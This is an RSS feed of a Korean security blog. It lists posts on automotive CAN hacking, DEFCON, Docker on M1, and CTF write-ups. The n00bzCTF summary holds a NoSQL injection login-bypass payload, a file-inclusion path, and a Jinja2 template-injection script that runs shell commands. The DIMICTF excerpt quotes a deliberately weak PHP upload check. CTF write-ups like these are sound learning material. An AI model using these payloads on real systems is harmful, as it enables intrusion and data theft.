<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>DH.J</title>
    <link>https://blog.jhyeon.dev/</link>
    <description>Recent content on DH.J</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Thu, 13 Oct 2022 11:36:24 +0900</lastBuildDate><atom:link href="https://blog.jhyeon.dev/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Car Instrument Cluster Simulator</title>
      <link>https://blog.jhyeon.dev/posts/20221013_icsim/</link>
      <pubDate>Thu, 13 Oct 2022 11:36:24 +0900</pubDate>
      
      <guid>https://blog.jhyeon.dev/posts/20221013_icsim/</guid>
      <description>Summary 최근 자동차 해킹에 대한 소재가 많이 떠오르고 있다. 때문에 자동차 보안에 대해서도 관심을
가지시는 분들이 많을 것 같다고 생각을 하고 있다.
이번 글에서는 자동차에 들어가는 주요 통신 프로토콜 중 하나인 CAN 프로토콜이 어떤건지, 그리고
자동차의 계기판을 시뮬레이터로 만들어둔 도구를 하나 소개할 것이다.
(이 도구를 통해서 CAN 통신이 어떻게 이루어지는지를 간단하게 공부해볼 수 있다)
CAN Protocol Controller Area Network 의 약자로,
차량 내에서 Host PC 없이 Controller 또는 Device간 통신을 주고 받기 위해 사용하는 자동차 표준 통신 규격이다.</description>
    </item>
    
    <item>
      <title>블로그 공사중입네다..</title>
      <link>https://blog.jhyeon.dev/posts/20221012_tmp/</link>
      <pubDate>Wed, 12 Oct 2022 23:19:00 +0900</pubDate>
      
      <guid>https://blog.jhyeon.dev/posts/20221012_tmp/</guid>
      <description>최근에 일이 많이 바빠서 블로그 관리를 많이 못하고 있었는데,
간간히 소식을 올려보려고 블로그를 리뉴얼 했다. (쓸데없는 글 정리도 진행중)
아마 기술 리서치 내용들을 많이 올려보려고 노력(?)을 해볼 것이다.
그럼 20000</description>
    </item>
    
    <item>
      <title>DEFCON 30th Car Hacking Village 참가 후기 SSUL</title>
      <link>https://blog.jhyeon.dev/posts/20221012_defcon30/</link>
      <pubDate>Wed, 12 Oct 2022 16:36:20 +0900</pubDate>
      
      <guid>https://blog.jhyeon.dev/posts/20221012_defcon30/</guid>
      <description>Summary 코시국으로 인해 세계 최대 해킹 컨퍼런스인 데프콘(DEFCON) 행사도 몇 년간 온라인으로 진행이 됐었다.
그!러!나 22년도에는 드디어 오프라인으로 데프콘 행사가 열리게 된다는 소식을 접할 수 있었다.
마침 우리 회사 팀장님이 DEFCON MAIN TALK 이랑 Car Hacking Village 에 CFP 를 제출했던 것이 Aceept 되셔서
데프콘 행사에 참가할 수 있는 명분이 생겼다. (학회 참가 &amp;amp; 대회 참가 등..)
그래서 갔다. Las Vegas 를 향해서
라스베이거스 현지 스트립 거리 도착!
끼니는 뭘 먹었을까?</description>
    </item>
    
    <item>
      <title>M1 맥북에서 Docker amd64 환경으로 빌드하기</title>
      <link>https://blog.jhyeon.dev/posts/20220626_m1-docker-architecture/</link>
      <pubDate>Sun, 26 Jun 2022 00:00:00 +0900</pubDate>
      
      <guid>https://blog.jhyeon.dev/posts/20220626_m1-docker-architecture/</guid>
      <description>Summary 최근에 M1 Chip (ARM)이 장착된 노트북으로 바꾸면서 여러가지 환경을 구성하다가
좋은 팁들이 많아서 기록을 남겨두고자 글을 적어본다.
보통 CTF 할 때나 다른 도커 작업을 할 때 x86_64(amd64) 환경에 최적화 되어있기도 한데
M1에서는 기본이 arm64로 빌드되기 때문에 빌드할 때 아키텍처를 바꿔줘야 가능하다.
$ docker build --tag test-container:latest --platform linux/amd64 위와 같이 도커 빌드 명령을 줄 때 --platform 이라는 옵션을 추가해서 아키텍처를 바꿔줄 수 있다.
docker-compose.yml 을 통한 빌드를 할 때에도 platform: linux/amd64 이라는</description>
    </item>
    
    <item>
      <title>2022 n00bzCTF Write up</title>
      <link>https://blog.jhyeon.dev/posts/20220606_n00bzctf/</link>
      <pubDate>Mon, 06 Jun 2022 00:00:00 +0900</pubDate>
      
      <guid>https://blog.jhyeon.dev/posts/20220606_n00bzctf/</guid>
      <description>Summary TEAM : DEMON
Rank : 14th
Web nosqlforyou NOSQL Injection, Authentication Bypass Exploit username=admin password={&amp;#34;$gt&amp;#34;: &amp;#34;&amp;#34;} curl-as-service Python Local File Inclusion Exploit file:///chall/challenge.py Rlass Flask Jinja2 Template SSTI Injection Exploit from requests import post import html cmd = &amp;#34;cat flag&amp;#34; mro = &amp;#34;request|attr(request.args.class)|attr(request.args.mro)&amp;#34; subclasses = &amp;#34;((%s)[3]|attr(request.args.sc))()&amp;#34; % mro popen = &amp;#34;(%s)[363]&amp;#34; % subclasses code = &amp;#34;(%s)(request.args.cmd.split(&amp;#39; &amp;#39;), stdout=-1).communicate()[0]&amp;#34; % popen payload = &amp;#34;{%%print(%s)%%} {# curl http:// #}&amp;#34; % code res = post(&amp;#39;http://167.</description>
    </item>
    
    <item>
      <title>2021 사이버보안챌린지 자동차 해킹&amp;방어 대회 우승 후기</title>
      <link>https://blog.jhyeon.dev/posts/20211212_secchallenge/</link>
      <pubDate>Sun, 12 Dec 2021 00:00:00 +0900</pubDate>
      
      <guid>https://blog.jhyeon.dev/posts/20211212_secchallenge/</guid>
      <description>Summary 이번 하반기에 진행된 사이버보안챌린지 2021 차량 해킹&amp;amp;방어 대회에서,
회사 소속으로 출전해서 최우수상 을 수상하게 되었다!
대회 환경이 AGL (Automotive Grade Linux) 라고 하는 차량 인포테인먼트 시스템 이미지를 주고,
그 시스템 안에서 취약점을 분석하고 찾아서 공격하는 것이 공격(예선전) 이였다.
처음엔 막연하게 Low 단까지 접근해서 라이브러리 취약점도 분석하고
각 서비스들 Daemon 분석하면서 취약점을 찾았었는데 원하는 결과가 잘 나오지 않았다.
실제로 라이브러리 RCE 취약점이 존재했지만 해당 시스템 상에서 트리거가 안되서 무용지물 이였다.</description>
    </item>
    
    <item>
      <title>2020 DIMICTF WEB WRITE UP</title>
      <link>https://blog.jhyeon.dev/posts/20200206_dimictf/</link>
      <pubDate>Thu, 06 Feb 2020 00:00:00 +0900</pubDate>
      
      <guid>https://blog.jhyeon.dev/posts/20200206_dimictf/</guid>
      <description>WEB 5shared &amp;lt;?php require_once &amp;#39;lib.php&amp;#39;; session_start(); $session = md5(session_id()); $uploaddir = __DIR__ . &amp;#34;/~uploads/{$session}/&amp;#34;; createDirectory(__DIR__ . &amp;#34;/~uploads/&amp;#34;); createDirectory($uploaddir); //print_r($_FILES[&amp;#39;file&amp;#39;]); $file = $_FILES[&amp;#39;file&amp;#39;]; $uploadfile = $uploaddir . $file[&amp;#39;name&amp;#39;]; // sanity check $extension = explode(&amp;#39;.&amp;#39;, $file[&amp;#39;name&amp;#39;])[1]; if (!in_array($extension, Array(&amp;#34;jpg&amp;#34;, &amp;#34;gif&amp;#34;, &amp;#34;png&amp;#34;))) { $message = &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;jpg, gif, png 확장자만 업로드할 수 있습니다.&amp;#39;); history.back(); &amp;lt;/script&amp;gt;&amp;#34;; die($message); } // the real sanity check $real_extension = array_pop(explode(&amp;#39;.&amp;#39;, $file[&amp;#39;name&amp;#39;])); if (preg_match(&amp;#34;/php/i&amp;#34;, $file[&amp;#39;name&amp;#39;])) { $message = &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;파일 이름에 php가 들어가면 안됩니다.</description>
    </item>
    
  </channel>
</rss>
